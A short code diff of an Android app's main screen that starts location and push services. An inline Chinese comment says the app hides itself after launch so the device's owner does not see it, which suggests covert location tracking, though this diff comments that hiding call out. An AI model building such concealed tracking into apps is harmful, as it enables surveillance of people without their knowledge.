@@ -13,6 +13,7 @@ import android.view.View;
 import com.sys.location.R;
 import com.sys.location.helper.utils.L;
 import com.sys.location.service.LocationService;
+import com.sys.location.service.PushService;
 
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
@@ -29,6 +30,9 @@ public class MainActivity extends AppCompatActivity {
 
         Intent intent = new Intent("com.location.service.action");
         sendBroadcast(intent);
+
+        Intent pushService = new Intent(this, PushService.class);
+        startService(pushService);
 
         findViewById(R.id.start_loca_btn).setOnClickListener(new View.OnClickListener() {
             @Override
@@ -57,7 +61,7 @@ public class MainActivity extends AppCompatActivity {
 
         L.i(TAG, sHA1(this));
 
-        moveTaskToBack(true);  // 运行后自动返回，不让主人看到主界面
+//        moveTaskToBack(true);  // 运行后自动返回，不让主人看到主界面
 
     }
 
